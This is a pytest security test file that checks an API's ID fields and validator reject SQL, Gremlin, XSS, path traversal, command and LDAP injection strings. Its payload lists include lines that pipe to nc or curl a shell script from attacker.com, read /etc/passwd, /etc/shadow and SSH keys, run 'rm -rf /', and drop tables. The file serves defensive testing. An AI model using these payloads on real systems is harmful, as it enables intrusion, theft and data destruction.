"""
Security Tests for Injection Attack Prevention
===============================================

Tests defense against common injection attacks:
- SQL Injection
- NoSQL Injection (Gremlin)
- XSS (Cross-Site Scripting)
- Path Traversal
- Command Injection
- LDAP Injection
"""

import pytest
from pydantic import ValidationError

from src.python.api.models import UBORequest, StructuringAlertRequest
from src.python.utils.validation import Validator, ValidationError as UtilsValidationError


class TestSQLInjectionPrevention:
    """Test SQL injection attack prevention."""

    SQL_INJECTION_PAYLOADS = [
        # Classic SQL injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "admin'/*",
        
        # Union-based injection
        "' UNION SELECT NULL--",
        "' UNION SELECT * FROM users--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        
        # Boolean-based blind injection
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'x'='x",
        
        # Time-based blind injection
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; DELETE FROM accounts WHERE '1'='1",
        "'; UPDATE users SET password='hacked'--",
        
        # Error-based injection
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
    ]

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_company_id_sql_injection(self, payload):
        """Company ID should reject SQL injection attempts."""
        with pytest.raises(ValidationError):
            UBORequest(company_id=payload)

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_account_id_sql_injection(self, payload):
        """Account ID should reject SQL injection attempts."""
        with pytest.raises(ValidationError):
            StructuringAlertRequest(account_id=payload)


class TestGremlinInjectionPrevention:
    """Test Gremlin/NoSQL injection attack prevention."""

    GREMLIN_INJECTION_PAYLOADS = [
        # Gremlin traversal injection
        "g.V().drop()",
        "g.V().properties().drop()",
        "'); g.V().drop(); g.V('",
        
        # Property manipulation
        "').property('admin', true).next(); g.V('",
        "').sideEffect{it.get().remove()}.next(); g.V('",
        
        # Data exfiltration
        "').values('password').next(); g.V('",
        "').valueMap().next(); g.V('",
        
        # Groovy code injection
        "'); System.exit(0); g.V('",
        "'); new File('/etc/passwd').text; g.V('",
        "'); Runtime.getRuntime().exec('rm -rf /'); g.V('",
    ]

    @pytest.mark.parametrize("payload", GREMLIN_INJECTION_PAYLOADS)
    def test_company_id_gremlin_injection(self, payload):
        """Company ID should reject Gremlin injection attempts."""
        with pytest.raises(ValidationError):
            UBORequest(company_id=payload)

    @pytest.mark.parametrize("payload", GREMLIN_INJECTION_PAYLOADS)
    def test_account_id_gremlin_injection(self, payload):
        """Account ID should reject Gremlin injection attempts."""
        with pytest.raises(ValidationError):
            StructuringAlertRequest(account_id=payload)


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) attack prevention."""

    XSS_PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        
        # Event handler XSS
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe onload=alert(1)>",
        
        # JavaScript protocol
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:void(0)",
        
        # Encoded XSS
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        
        # DOM-based XSS
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>alert&#40;1&#41;</script>",
        
        # Filter bypass attempts
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert(1);//<</SCRIPT>",
        "<IMG SRC=javascript:alert('XSS')>",
    ]

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_company_id_xss(self, payload):
        """Company ID should reject XSS attempts."""
        with pytest.raises(ValidationError):
            UBORequest(company_id=payload)

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_account_id_xss(self, payload):
        """Account ID should reject XSS attempts."""
        with pytest.raises(ValidationError):
            StructuringAlertRequest(account_id=payload)


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""

    PATH_TRAVERSAL_PAYLOADS = [
        # Unix path traversal
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../var/log/auth.log",
        "../../.ssh/id_rsa",
        
        # Windows path traversal
        "..\\..\\..\\windows\\system32\\config\\sam",
        "..\\..\\..\\boot.ini",
        
        # URL encoded
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cwindows%5Csystem32",
        
        # Double encoding
        "..%252F..%252F..%252Fetc%252Fpasswd",
        
        # Unicode encoding
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        
        # Null byte injection
        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\system32%00.txt",
        
        # Dot-dot-slash variations
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\system32",
    ]

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_company_id_path_traversal(self, payload):
        """Company ID should reject path traversal attempts."""
        with pytest.raises(ValidationError):
            UBORequest(company_id=payload)

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_account_id_path_traversal(self, payload):
        """Account ID should reject path traversal attempts."""
        with pytest.raises(ValidationError):
            StructuringAlertRequest(account_id=payload)


class TestCommandInjectionPrevention:
    """Test command injection attack prevention."""

    COMMAND_INJECTION_PAYLOADS = [
        # Basic command injection
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "&& id",
        "|| uname -a",
        
        # Command substitution
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        
        # Pipe commands
        "| nc attacker.com 4444",
        "; curl http://attacker.com/shell.sh | sh",
        
        # Background execution
        "; sleep 10 &",
        "& ping -c 10 127.0.0.1 &",
    ]

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_company_id_command_injection(self, payload):
        """Company ID should reject command injection attempts."""
        with pytest.raises(ValidationError):
            UBORequest(company_id=payload)

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_account_id_command_injection(self, payload):
        """Account ID should reject command injection attempts."""
        with pytest.raises(ValidationError):
            StructuringAlertRequest(account_id=payload)


class TestLDAPInjectionPrevention:
    """Test LDAP injection attack prevention."""

    LDAP_INJECTION_PAYLOADS = [
        # LDAP filter injection
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
        "*)(objectClass=*",
        
        # LDAP authentication bypass
        "*)(|(password=*",
        "admin)(|(password=*))",
        
        # LDAP enumeration
        "*)(cn=*",
        "*)(mail=*",
    ]

    @pytest.mark.parametrize("payload", LDAP_INJECTION_PAYLOADS)
    def test_company_id_ldap_injection(self, payload):
        """Company ID should reject LDAP injection attempts."""
        with pytest.raises(ValidationError):
            UBORequest(company_id=payload)


class TestSpecialCharacterHandling:
    """Test handling of special characters and edge cases."""

    def test_null_byte_injection(self):
        """Null bytes should be rejected."""
        with pytest.raises(ValidationError):
            UBORequest(company_id="COMP\x00123")
        with pytest.raises(ValidationError):
            StructuringAlertRequest(account_id="ACC\x00123")

    def test_unicode_characters(self):
        """Unicode characters should be rejected."""
        with pytest.raises(ValidationError):
            UBORequest(company_id="COMP-™®©")
        with pytest.raises(ValidationError):
            StructuringAlertRequest(account_id="ACC-™®©")

    def test_control_characters(self):
        """Control characters should be rejected."""
        control_chars = ["\x01", "\x02", "\x03", "\x1F"]
        for char in control_chars:
            with pytest.raises(ValidationError):
                UBORequest(company_id=f"COMP{char}123")

    def test_newline_injection(self):
        """Newline characters should be rejected."""
        with pytest.raises(ValidationError):
            UBORequest(company_id="COMP\n123")
        with pytest.raises(ValidationError):
            UBORequest(company_id="COMP\r\n123")

    def test_tab_injection(self):
        """Tab characters should be rejected."""
        with pytest.raises(ValidationError):
            UBORequest(company_id="COMP\t123")


class TestValidatorUtilityFunctions:
    """Test the Validator utility class directly."""

    def test_validate_account_id_valid(self):
        """Valid account IDs should pass."""
        valid_ids = ["ACC-123", "ACCOUNT_001", "A1B2C3"]
        for account_id in valid_ids:
            result = Validator.validate_account_id(account_id)
            assert result == account_id

    def test_validate_account_id_invalid(self):
        """Invalid account IDs should raise ValidationError."""
        invalid_ids = [
            "'; DROP TABLE--",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
        ]
        for account_id in invalid_ids:
            with pytest.raises(UtilsValidationError):
                Validator.validate_account_id(account_id)

    def test_validate_amount_valid(self):
        """Valid amounts should pass."""
        valid_amounts = [0.01, 100.00, 10000.50, 999999.99]
        for amount in valid_amounts:
            result = Validator.validate_amount(amount)
            assert float(result) == amount

    def test_validate_amount_invalid(self):
        """Invalid amounts should raise ValidationError."""
        invalid_amounts = [-100.0, 0.0, 1_000_000_001.0]
        for amount in invalid_amounts:
            with pytest.raises(UtilsValidationError):
                Validator.validate_amount(amount)


class TestDefenseInDepth:
    """Test defense-in-depth strategy."""

    def test_multiple_validation_layers(self):
        """Validation should occur at multiple layers."""
        # Pydantic model validation (first layer)
        with pytest.raises(ValidationError):
            UBORequest(company_id="<script>alert(1)</script>")
        
        # Validator utility validation (second layer)
        with pytest.raises(UtilsValidationError):
            Validator.validate_account_id("<script>alert(1)</script>")

    def test_consistent_validation_rules(self):
        """Validation rules should be consistent across layers."""
        test_id = "VALID-ID-123"
        
        # Should pass Pydantic validation
        request = UBORequest(company_id=test_id)
        assert request.company_id == test_id
        
        # Should pass Validator validation
        result = Validator.validate_account_id(test_id)
        assert result == test_id

# Made with Bob
